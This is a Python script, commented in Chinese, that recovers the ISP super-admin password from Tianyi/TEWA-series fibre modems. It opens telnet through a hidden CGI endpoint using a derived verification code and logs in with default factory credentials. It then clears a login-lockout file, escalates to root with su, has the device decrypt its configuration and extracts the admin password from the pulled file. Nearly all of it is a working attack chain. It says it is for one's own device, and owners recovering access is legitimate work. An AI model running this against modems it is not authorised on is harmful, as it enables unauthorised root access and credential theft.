#!/usr/bin/env python3
"""recover_superpass_template.py — 光猫超级口令恢复脚本模板（天邑/TEWA 系链路）

本模板来自实机验证过的流程，**只留骨架，所有凭据/派生值都是占位符**。
用之前请把下面 CONFIG 区填好，并确认设备是你自己的。

链路（每步都有替代方案，见 docs/01-methodology.md）：
  1. POST /distelnet.cgi                          关掉可能残留的 telnet
  2. POST /entelnet.cgi  body: Verification_code=<A1衍生值>   打开 23
  3. telnet <GW>         <telnet账号>/<telnet口令>             -> 普通用户 shell
  4. : > /tmp/login/login_status_log                          清 60s 授权锁计数
  5. su -c '...'         <A1衍生值>（就是 su 口令）            -> root
  6. hi_ipc /home/cmd/encrypt/decrypt_file -v ifile <加密配置> ofile /tmp/out.xml
     让设备自己解密（key 只在 encrypt 线程内存，离线解不了）
  7. gzip+base64+dd 分块拉回                                   -> 本地明文
  8. grep aucTeleAccountPassword                               -> 超管口令
  9. POST /distelnet.cgi                                      无论成败都关 telnet

依赖：python3（标准库 telnetlib）+ curl。telnet 交互必须真 tty 语义——本脚本用
read_until(b'Password:') 等提示符，不要改成管道喂 stdin（会静默失败）。
"""
import base64
import gzip
import hashlib
import os
import re
import subprocess
import sys
import time
import telnetlib

# ─────────────────────────── CONFIG：用之前填这里 ───────────────────────────
GW = "192.168.1.1"                       # 光猫地址
PORT_WEB = 8080                          # 中间件 Web（entelnet 挂在它上面）
VERIFY_CODE = "<A1衍生值>"                # 由设备标识派生的 8 位值，见 docs/01 §3.4
SU_PASS = VERIFY_CODE                    # 通常与 Verification_code 同一个值
TEL_USER = "telnetadmin"                 # 出厂 telnet 账号（型号不同可能是 admin）
TEL_PASS = "telnetadmin"
ENC_CFG = "/config/work/lastgood.xml"    # 加密配置（不同机型路径不同）
DEC_CMD = ("hi_ipc /home/cmd/encrypt/decrypt_file "
           "-v ifile {src} ofile /tmp/out.xml")   # 设备自带解密命令
DEC_OUT = "/tmp/out.xml"                 # 设备侧明文
LOCAL_OUT = "lastgood.dec.xml"           # 本地落盘
CHUNK = 98304                            # dd 分块大小（太大 telnetd 会断）
# ────────────────────────────────────────────────────────────────

USAGE = """用法（照着三行走）：

  1) 先改本文件顶部 CONFIG 区的 6 个值：
       GW           光猫地址，一般 192.168.1.1
       VERIFY_CODE  A1 第 5 张表派生的 8 位值（设备 MAC 后 8 位倒序喂进去）
       SU_PASS      通常与 VERIFY_CODE 同值
       TEL_USER / TEL_PASS   出厂 telnet 账号，多为 telnetadmin/telnetadmin
       ENC_CFG      加密配置路径，天邑常见 /config/work/lastgood.xml
  2) python3 recover_superpass_template.py --check   只探 8080 在不在线（不改设备）
  3) python3 recover_superpass_template.py           跑全流程，成功后本地得到
                                                      lastgood.dec.xml，里面 grep 到
                                                      aucTeleAccountPassword 就是超管口令

VERIFY_CODE 怎么算：见 docs/01-methodology.md §3.4（A1 五表，天邑海思用第 5 张）
"""

BASE = f"http://{GW}:{PORT_WEB}"


def curl(path, data=None, timeout=12):
    cmd = ["curl", "-s", "-m", str(timeout), "-X", "POST", BASE + path]
    if data:
        cmd += ["--data", data]
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 6).stdout.strip()
    except Exception as e:
        return f"<err {type(e).__name__}>"


def tel_connect(tries=10, sleep=6.0):
    for i in range(tries):
        tn = None
        try:
            tn = telnetlib.Telnet(GW, 23, timeout=15)
            banner = tn.read_until(b"Login:", timeout=12)
        except Exception:
            time.sleep(sleep)
            continue
        if b"Login:" not in banner:
            tn.close()
            time.sleep(sleep)
            continue
        tn.write(TEL_USER.encode() + b"\n")
        tn.read_until(b"Password:", timeout=10)
        tn.write(TEL_PASS.encode() + b"\n")
        time.sleep(1.0)
        if b"$" in tn.read_until(b"$ ", timeout=10):
            return tn
        tn.close()
        time.sleep(sleep)
    return None


def sh(tn, cmd, wait=25):
    tn.write(cmd.encode() + b"\n")
    time.sleep(0.4)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < wait:
        try:
            c = tn.read_very_eager()
        except Exception:
            break
        if c:
            buf += c
            if buf.rstrip().endswith((b"$", b"# ")):
                break
        time.sleep(0.2)
    return buf.decode("utf-8", "replace").replace("\r", "")


def phase_decrypt():
    """开 telnet -> root -> 让设备自解配置。"""
    curl("/distelnet.cgi")
    time.sleep(4)
    r = curl("/entelnet.cgi", f"Verification_code={VERIFY_CODE}")
    print("[entelnet]", r[:120])
    time.sleep(6)

    tn = tel_connect()
    if not tn:
        print("[fail] telnet 连不上：23 未开 / 账号不对 / telnetd 被踢死（等 2-3 分钟再试）")
        return False
    try:
        sh(tn, ": > /tmp/login/login_status_log")          # 清授权锁（该文件通常 0666）

        tn.write(f"su -c '{DEC_CMD.format(src=ENC_CFG)}; "
                 f"wc -c < {DEC_OUT}; md5sum {DEC_OUT} | cut -c1-32; echo SURES'\n".encode())
        buf = b""
        t0 = time.time()
        while time.time() - t0 < 25:                        # 等 Password: 提示符，别急着投
            c = tn.read_very_eager()
            if c:
                buf += c
                if b"assword" in buf:
                    break
            time.sleep(0.25)
        tn.write(SU_PASS.encode() + b"\n")                  # 关键：真 tty 交互才要口令
        t0 = time.time()
        while time.time() - t0 < 40:
            c = tn.read_very_eager()
            if c:
                buf += c
                if b"SURES" in buf:
                    break
            time.sleep(0.3)
        out = buf.decode("utf-8", "replace").replace("\r", "")
        print(out.strip()[-400:])
        if "succ." not in out and "uid=0" not in out:
            print("[fail] 没拿到 root 或解密失败（检查 su 口令、解密命令路径）")
            return False
        return True
    finally:
        try:
            tn.close()
        except Exception:
            pass


def phase_pull():
    """gzip + base64 + dd 分块拉回（设备到 LAN 常不能回连，只能这么搬）。"""
    tn = tel_connect()
    if not tn:
        print("[fail] 搬运阶段连不上 telnet")
        return False
    try:
        head = sh(tn, f"gzip -9 -c {DEC_OUT} > /tmp/o.gz; wc -c < /tmp/o.gz; "
                      f"md5sum {DEC_OUT} | cut -c1-32")
        m = re.search(r"(\d{4,})", head)
        gz = int(m.group(1)) if m else 0
        md = re.findall(r"([0-9a-f]{32})", head)
        src_md5 = md[-1] if md else ""
        sh(tn, "base64 /tmp/o.gz | tr -d '\\n' > /tmp/o.b64; wc -c < /tmp/o.b64")
        m = re.search(r"(\d{4,})", sh(tn, "wc -c < /tmp/o.b64"))
        b64len = int(m.group(1)) if m else 0
        if not b64len:
            print("[fail] base64 生成失败")
            return False
        n = b64len // CHUNK + 1
        parts = {}
        for i in range(n):
            seg = sh(tn, f"dd if=/tmp/o.b64 bs={CHUNK} skip={i} count=1 2>/dev/null", wait=25)
            s = "".join(l for l in seg.split("\n")
                        if l and not l.startswith("dd ") and l.strip() not in ("$", "cut -c1-32"))
            if re.fullmatch(r"[A-Za-z0-9+/=]+", s or ""):
                parts[i] = s
            else:
                time.sleep(1.2)
                seg = sh(tn, f"dd if=/tmp/o.b64 bs={CHUNK} skip={i} count=1 2>/dev/null", wait=25)
                parts[i] = "".join(l for l in seg.split("\n") if re.fullmatch(r"[A-Za-z0-9+/=]+", l or ""))
            print(f"[{i+1}/{n}] {len(parts[i])} chars", flush=True)
        blob = "".join(parts[k] for k in sorted(parts))
        raw = base64.b64decode(blob + "=" * ((4 - len(blob) % 4) % 4))
        xml = gzip.decompress(raw)
        open(LOCAL_OUT, "wb").write(xml)
        got = hashlib.md5(xml).hexdigest()
        print(f"[md5] {got} vs 设备 {src_md5} -> {'MATCH' if got == src_md5 else 'MISMATCH'}")
        return got == src_md5
    finally:
        try:
            tn.close()
        except Exception:
            pass


def phase_grep():
    if not os.path.exists(LOCAL_OUT):
        print("[fail] 本地没有", LOCAL_OUT)
        return False
    txt = open(LOCAL_OUT, encoding="utf-8", errors="replace").read()
    tp = re.search(r'Name="aucTeleAccountPassword" Value="([^"]*)"', txt)
    tn_ = re.search(r'Name="aucTeleAccountName" Value="([^"]*)"', txt)
    if not tp:
        print("[fail] 配置里没找到 aucTeleAccountPassword（字段名可能不同，手动 grep telecom/Account）")
        return False
    print("=" * 56)
    print(f"超管账号： {tn_.group(1) if tn_ else '?'} / {tp.group(1)}")
    print("=" * 56)
    return True


def main():
    argv = sys.argv[1:]
    if "-h" in argv or "--help" in argv:
        print(USAGE)
        return 0
    if "--check" in argv:
        body = curl("/usr_logon.html")
        alive = bool(body)
        print("[check]", "8080 在线，可以往下走" if alive else f"8080 没响应（{body[:60] or '空'}）")
        print("[check] 先确认你是从光猫 LAN 侧访问，且地址是", BASE)
        return 0 if alive else 1
    if "<" in VERIFY_CODE or "<" in SU_PASS:
        print(USAGE)
        print("[abort] CONFIG 区还是占位符，先把 VERIFY_CODE / SU_PASS 填成真值再跑。")
        return 2
    ok = phase_decrypt()
    if ok:
        ok = phase_pull()
    if ok:
        ok = phase_grep()
    print("[cleanup]", curl("/distelnet.cgi")[:80])
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
